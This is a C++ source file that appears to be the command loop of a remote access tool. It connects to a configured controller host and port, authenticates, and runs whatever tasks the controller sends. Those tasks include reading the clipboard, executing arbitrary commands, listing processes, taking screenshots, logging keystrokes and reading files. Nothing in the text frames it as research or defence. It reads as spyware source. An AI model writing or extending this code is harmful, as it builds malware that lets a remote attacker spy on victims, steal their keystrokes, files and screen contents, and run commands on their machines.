#include "connection/client.h"
#include "config.h"
#include "tasks/get_clipboard.h"
#include "tasks/exec_command.h"
#include "tasks/get_process_list.h"
#include "tasks/get_screenshot.h"
#include "tasks/listen_keyboard.h"
#include "tasks/get_file_content.h"

void startClient() {
    client cli(config::host, config::port);
    cli.connect();
    cli.handshake(config::id, config::key, control);
    client::instance = &cli;
    while (cli.isConnected()) {
        string packet = cli.receivePacket();
        auto req = request::parse(packet);
        cli.sendPacket(response{received, req.task_id }.dump());
        switch (req.cmd) {
            case GetClipboard: {
                task *t = new get_clipboard(req.task_id);
                t->execute();
                break;
            }
            case ExecCommand: {
	            task* t = new exec_command(req.task_id, req.param);
	            t->execute();
	            break;
            }
            case GetProcessList: {
                task* t = new get_process_list(req.task_id);
                t->execute();
                break;
	        }
            case GetScreenshot: {
                task* t = new get_screenshot(req.task_id);
                t->execute();
                break;
            }
            case ListenKeyboard: {
                task* t = new listen_keyboard(req.task_id);
                t->execute();
                break;
        	}
            case GetFileContent: {
                task* t = new get_file_content(req.task_id, req.param);
                t->execute();
                break;
            }
            default:
                break;
        }
    }
}
